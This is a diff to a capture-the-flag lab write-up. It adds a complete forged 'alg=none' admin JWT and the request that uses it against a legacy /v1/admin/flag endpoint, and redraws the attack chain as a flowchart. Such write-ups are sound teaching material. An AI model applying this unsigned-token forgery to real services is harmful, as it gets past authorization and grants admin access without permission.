@@ -73,7 +73,7 @@ Decoding the JWT payload showed:
 ```json
 {
   "id": 4,
-  "username": "fashil",
+  "username": "test",
   "role": "user",
   "iat": 1789838125
 }
@@ -162,7 +162,16 @@ Use the crafted token against:
 GET /v1/admin/flag
 ```
 
-Example:
+Send:
+```http
+GET https://lab-1789837962033-8pighs.labs-app.bugforge.io/v1/admin/flag
+```
+With the Header
+```http
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4OTgzODEyNX0.
+```
+
+Or:
 
 ```bash
 curl -i \
@@ -193,31 +202,18 @@ bug{Ic7jW6vPmqBelPPe6hYxmJrPEgiDJAWg}
 ```
 
 ## Attack Chain
-
-```text
-Obfuscated JavaScript
-        ↓
-Discover /v2/admin/flag
-        ↓
-Request returns "Admin access required"
-        ↓
-Inspect JWT
-        ↓
-JWT contains role=user
-        ↓
-Challenge hint says "different path"
-        ↓
-Test API version /v1/
-        ↓
-Discover /v1/admin/flag
-        ↓
-Craft admin JWT with alg=none
-        ↓
-Send Authorization header
-        ↓
-HTTP 200
-        ↓
-Retrieve flag
+```mermaid
+flowchart TD
+A["Inspect Obfuscated JavaScript"] --> B["Discover /v2/admin/flag"]
+B --> C["Request /v2/admin/flag"]
+C --> D["Request returns "Admin access required""]
+D --> E["Inspect JWT"]
+E --> F["Notice JWT contains role=user"]
+F --> G["Test API version /v1/"]
+G --> H["Discover /v1/admin/flag"]
+H --> I["Craft admin JWT with alg=none"]
+I --> J["Send GET Request to /v1/admin/flag with Authorization header having crafted JWT"]
+J --> K["Retrieve the flag"]
 ```
 
 ## Vulnerabilities Demonstrated
